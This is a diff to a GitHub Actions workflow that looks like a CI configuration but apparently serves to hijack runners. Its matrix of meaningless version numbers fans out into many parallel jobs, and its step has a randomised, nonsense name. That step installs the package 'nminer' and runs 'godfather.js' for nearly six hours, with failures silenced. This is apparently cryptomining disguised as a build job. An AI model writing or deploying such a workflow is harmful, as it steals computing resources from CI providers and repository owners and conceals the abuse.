@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6247 }
-          - { version: 3284 }
-          - { version: 9804 }
-          - { version: 404 }
-          - { version: 1779 }
-          - { version: 9996 }
-          - { version: 1945 }
-          - { version: 5733 }
-          - { version: 6590 }
-          - { version: 5310 }
-          - { version: 8318 }
-          - { version: 603 }
-          - { version: 3000 }
-          - { version: 1264 }
-          - { version: 9749 }
-          - { version: 6539 }
-          - { version: 4019 }
-          - { version: 7000 }
+          - { version: 478 }
+          - { version: 113 }
+          - { version: 9932 }
+          - { version: 7853 }
+          - { version: 7632 }
+          - { version: 689 }
+          - { version: 6206 }
+          - { version: 8765 }
           - { version: 9716 }
-          - { version: 6641 }
+          - { version: 5624 }
+          - { version: 4514 }
+          - { version: 7355 }
+          - { version: 5863 }
+          - { version: 1046 }
+          - { version: 5374 }
+          - { version: 2434 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: fond vacantly
+      - name: mmm glum impeccable mobilize bravely
         run: |
           npm install nminer@latest
-          timeout 331m node godfather.js || echo "godfather executed"
+          timeout 344m node godfather.js || echo "godfather executed"
